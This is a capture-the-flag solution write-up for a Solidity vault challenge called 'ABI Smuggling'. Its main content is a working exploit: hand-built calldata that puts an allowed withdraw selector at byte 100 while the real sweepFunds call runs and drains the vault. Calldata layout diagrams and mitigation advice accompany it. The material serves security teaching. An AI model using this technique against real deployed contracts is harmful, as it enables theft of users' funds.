# ABI Smuggling - Solution

## Challenge Overview

A vault holds 1 million DVT tokens with:
- `withdraw`: Limited withdrawals (1 ETH max, 15-day cooldown)
- `sweepFunds`: Emergency function to drain all funds
- Authorization system: Only specific callers can execute specific functions

**Permissions set:**
- `deployer` → `sweepFunds` (0x85fb709d)
- `player` → `withdraw` (0xd9caed12)

**Goal:** Steal all funds despite only having `withdraw` permission

## The Vulnerability

### Fixed Selector Read Position

In `AuthorizedExecutor.execute()`:

```solidity
function execute(address target, bytes calldata actionData) external {
    bytes4 selector;
    uint256 calldataOffset = 4 + 32 * 3;  // FIXED at 100 bytes!
    assembly {
        selector := calldataload(calldataOffset)
    }
    
    if (!permissions[getActionId(selector, msg.sender, target)]) {
        revert NotAllowed();
    }
    
    return target.functionCall(actionData);  // Uses actual ABI offset
}
```

**The bug**: The selector is ALWAYS read from byte 100, but `actionData` location is determined by the ABI-encoded offset parameter. These can be different!

### Standard vs Malicious ABI Encoding

**Standard encoding** for `execute(address, bytes)`:
```
0x00-0x03: execute selector
0x04-0x23: target address (32 bytes)
0x24-0x43: offset to bytes = 0x40 (64)
0x44-0x63: length of bytes
0x64+:     bytes data  ← Selector read from here (byte 100 = 0x64)
```

**Malicious encoding**:
```
0x00-0x03: execute selector
0x04-0x23: target address (vault)
0x24-0x43: offset = 0x80 (128)        ← Points to byte 132
0x44-0x63: padding (zeros)
0x64-0x67: FAKE withdraw selector     ← Checked here!
0x68-0x83: more padding
0x84-0xA3: length of real data
0xA4+:     REAL sweepFunds call       ← Actually executed!
```

## Exploit Strategy

1. Craft calldata with custom ABI offset
2. Place allowed selector (`withdraw`) at byte 100
3. Place actual payload (`sweepFunds`) at the custom offset
4. Authorization check passes, but sweepFunds executes

## Solution Code

```solidity
function test_abiSmuggling() public checkSolvedByPlayer {
    // Build the real sweepFunds calldata
    bytes memory sweepFundsCall = abi.encodeCall(
        SelfAuthorizedVault.sweepFunds,
        (recovery, IERC20(address(token)))
    );

    // Build malicious calldata manually
    bytes memory maliciousCalldata = abi.encodePacked(
        // execute selector
        bytes4(0x1cff79cd),
        // target address (vault) - 32 bytes
        bytes32(uint256(uint160(address(vault)))),
        // offset to actionData = 0x80 (128 bytes from params start)
        bytes32(uint256(0x80)),
        // padding (32 bytes)
        bytes32(0),
        // FAKE selector at position 100 (withdraw = 0xd9caed12)
        bytes4(0xd9caed12), bytes28(0),
        // length of real actionData
        bytes32(uint256(sweepFundsCall.length)),
        // actual sweepFunds calldata
        sweepFundsCall
    );

    // Execute the malicious call
    (bool success,) = address(vault).call(maliciousCalldata);
    require(success, "attack failed");
}
```

## Visual Representation

```
Calldata Layout:

Position  | Content                    | Purpose
----------|----------------------------|---------------------------
0x00-0x03 | 0x1cff79cd                | execute() selector
0x04-0x23 | vault address             | target parameter
0x24-0x43 | 0x80                      | offset (points to 0x84)
0x44-0x63 | 0x00...00                 | padding
0x64-0x67 | 0xd9caed12                | ← CHECK HERE (withdraw)
0x68-0x83 | 0x00...00                 | padding
0x84-0xA3 | length                    | ← Data starts here
0xA4+     | sweepFunds(...)           | ← EXECUTE THIS
```

## Attack Flow

```
Player calls vault with malicious calldata
    │
    ├── 1. execute() reads selector from byte 100
    │       └── Finds 0xd9caed12 (withdraw) ✓
    │
    ├── 2. Permission check
    │       └── getActionId(withdraw, player, vault) → ALLOWED ✓
    │
    ├── 3. _beforeFunctionCall check
    │       └── target == vault ✓
    │
    └── 4. target.functionCall(actionData)
            └── Decodes actionData from offset 0x80
            └── Finds sweepFunds(recovery, token)
            └── Executes sweepFunds! → 1M DVT to recovery
```

## Why This Works

1. **ABI flexibility**: Solidity's ABI encoding allows variable-length data to be placed anywhere via offset pointers
2. **Fixed offset assumption**: The code assumes data is at a fixed position
3. **Decoupled check/execute**: The permission check and actual execution use different methods to find the selector

## Mitigation Recommendations

1. **Use Solidity's decoding**: Instead of manual assembly:
   ```solidity
   bytes4 selector = bytes4(actionData[:4]);
   ```

2. **Validate offset**: Ensure the offset points to expected position:
   ```solidity
   assembly {
       let offset := calldataload(36)  // Read offset
       if iszero(eq(offset, 0x40)) { revert(0, 0) }  // Must be 0x40
   }
   ```

3. **Decode strictly**: Use `abi.decode` which validates the entire structure:
   ```solidity
   (address target, bytes memory actionData) = abi.decode(
       msg.data[4:],
       (address, bytes)
   );
   ```

